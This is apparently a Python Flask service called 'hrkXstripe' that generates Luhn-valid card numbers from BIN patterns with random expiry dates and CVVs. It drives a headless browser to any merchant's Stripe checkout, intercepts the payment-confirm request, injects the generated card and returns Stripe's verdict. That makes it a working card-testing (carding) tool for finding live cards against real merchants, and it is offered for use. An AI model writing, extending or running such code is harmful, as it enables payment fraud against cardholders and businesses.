import os
import asyncio
import requests
import json
import random
import time
from datetime import datetime
from playwright.async_api import async_playwright, Error as PlaywrightError
from flask import Flask, request, jsonify
from dotenv import load_dotenv

# Load environment variables from the .env file
load_dotenv()

# --- 1. CONFIGURATION ---
CONFIG = {
    "RUN_LOCAL": os.getenv('RUN_LOCAL', 'false').lower() == 'true',
    "BROWSERLESS_API_KEY": os.getenv('BROWSERLESS_API_KEY'),
    "BOT_TOKEN": os.getenv('BOT_TOKEN'),
    "DEFAULT_CHAT_ID": os.getenv('DEFAULT_CHAT_ID'),
    "RESPONSE_TIMEOUT_SECONDS": 25 # How long to wait for Stripe after clicking 'Pay'
}

# A crucial check to prevent the app from starting without the required key
if not CONFIG["RUN_LOCAL"] and not CONFIG["BROWSERLESS_API_KEY"]:
    raise ValueError("FATAL: You are in headless mode. BROWSERLESS_API_KEY must be set in your .env file or environment!")

# --- 2. CARD GENERATION & TELEGRAM LOGIC (Unchanged) ---
def luhn_algorithm(number_str):
    total, reverse_digits = 0, number_str[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if (i % 2) == 1: n = n * 2 - 9 if n > 4 else n * 2
        total += n
    return total % 10 == 0
def complete_luhn(base):
    for d in range(10):
        candidate = base + str(d)
        if luhn_algorithm(candidate): return candidate
    return None
def get_card_length(bin_str): return 15 if bin_str[:2] in ['34', '37'] else 16
def get_cvv_length(card_number): return 4 if len(card_number) == 15 else 3
def random_digit(): return str(random.randint(0, 9))
def generate_card_from_pattern(pattern):
    card_length = get_card_length(pattern.replace('x', '0'))
    base = ''.join([random_digit() if c == 'x' else c for c in pattern])
    while len(base) < card_length - 1: base += random_digit()
    base = base[:card_length - 1]
    return complete_luhn(base) or base + '0'
def process_card_with_placeholders(number, month, year, cvv):
    processed_number = generate_card_from_pattern(number) if 'x' in number else number
    processed_month = str(random.randint(1, 12)).zfill(2) if 'x' in month.lower() else month.zfill(2)
    current_year = datetime.now().year
    processed_year = str(random.randint(current_year + 1, current_year + 8)) if 'x' in year.lower() else ('20' + year if len(year) == 2 else year)
    cvv_length = get_cvv_length(processed_number)
    processed_cvv = ''.join([random_digit() for _ in range(cvv_length)]) if 'x' in cvv.lower() else cvv
    return {"number": processed_number, "month": processed_month, "year": processed_year, "cvv": processed_cvv}
def get_card(target_bin):
    parts = target_bin.split('|')
    return process_card_with_placeholders(*parts) if len(parts) == 4 else None

# --- 3. THE CORE AUTOMATION TASK (MODIFIED TO RETURN A RESULT) ---
def run_automation_task(target_url, target_bin, target_email):
    """This function runs the automation and returns the Stripe JSON response."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def perform_automation():
        stripe_response_future = asyncio.Future()

        async with async_playwright() as p:
            browser = None
            try:
                if CONFIG["RUN_LOCAL"]:
                    browser = await p.chromium.launch(headless=False, slow_mo=50)
                else:
                    browserless_url = f"wss://chrome.browserless.io?token={CONFIG['BROWSERLESS_API_KEY']}"
                    browser = await p.chromium.connect_over_cdp(browserless_url, timeout=120000)
                print("[SUCCESS] Browser connected.")
            except Exception as e:
                return {"error": "Could not connect to browser", "details": str(e)}

            context = await browser.new_context(user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36')
            page = await context.new_page()

            async def handle_stripe_post(route):
                card_details = get_card(target_bin)
                print(f"\n[ATTEMPT] Intercepting POST. Injecting Card: {card_details['number']}")
                form_data = dict(x.split('=', 1) for x in (route.request.post_data or "").split('&') if '=' in x)
                form_data.update({
                    'card[number]': card_details['number'], 'card[exp_month]': card_details['month'],
                    'card[exp_year]': card_details['year'], 'card[cvc]': card_details['cvv'],
                    'email': target_email or 'test.email.vclub@example.com'
                })
                await route.continue_(post_data=form_data)

            async def handle_response(response):
                if "payment_intents" in response.url and "/confirm" in response.url and response.request.method == "POST":
                    try:
                        data = await response.json()
                        if not stripe_response_future.done(): stripe_response_future.set_result(data)
                    except Exception as e:
                        if not stripe_response_future.done(): stripe_response_future.set_exception(e)

            await page.route("**/v1/payment_intents/**/confirm", handle_stripe_post)
            page.on("response", handle_response)
            
            try:
                await page.goto(target_url, wait_until="networkidle", timeout=45000)
            except PlaywrightError as e:
                return {"error": "Failed to navigate to the target page", "details": str(e)}

            try:
                submit_button_selector = '.SubmitButton, button[type="submit"], #submit, button:has-text("Pay")'
                await page.locator(submit_button_selector).first.click(timeout=15000)
                print("[ACTION] Clicked submit. Waiting for Stripe response...")
                result = await asyncio.wait_for(stripe_response_future, timeout=CONFIG["RESPONSE_TIMEOUT_SECONDS"])
                return result
            except (PlaywrightError, asyncio.TimeoutError) as e:
                return {"error": "Could not find/click button or timed out waiting for Stripe API response.", "details": str(e)}
            finally:
                await browser.close()
    
    return loop.run_until_complete(perform_automation())

# --- 4. FLASK API DEFINITION (SYNCHRONOUS GET REQUEST) ---
app = Flask(__name__)

@app.route('/')
def index():
    return "hrkXstripe API is running.", 200

@app.route('/hrkXstripe', methods=['GET'])
def get_stripe_response_endpoint():
    # Get parameters from URL query string
    target_url = request.args.get('url')
    target_cc = request.args.get('cc')
    target_email = request.args.get('email') # Optional
    
    print(f"\n{'='*50}\nAPI CALL (GET): url='{target_url}', cc='{target_cc}', email='{target_email}'")

    if not target_url or not target_cc:
        return jsonify({"error": "Missing required query parameters. 'url' and 'cc' are mandatory."}), 400

    # This call BLOCKS until the automation is done.
    result = run_automation_task(target_url, target_cc, target_email)
    
    # Print the raw response to the console
    print("\n--- STRIPE RAW RESPONSE ---")
    print(json.dumps(result, indent=2))
    print("---------------------------\n")
    
    if result and 'error' not in result:
        return jsonify(result), 200 # Success, return Stripe's JSON
    elif result:
        return jsonify(result), 500 # Automation error
    else:
        return jsonify({"error": "An unknown error occurred."}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    app.run(host='0.0.0.0', port=port)
